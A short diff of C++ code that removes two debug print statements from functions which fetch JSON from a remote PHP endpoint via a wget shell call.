@@ -981,8 +981,6 @@ int rand_index = rand() % 1;
 
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
     
-    cout << url << "\\n";
-    
     response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
     
     json::JSON info = json::JSON::Load(response);
@@ -1031,8 +1029,6 @@ srand(time(0));
 int rand_index = rand() % 1;
  
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux84";
-    
-    cout << url << "\\n";
     
     string response;
     
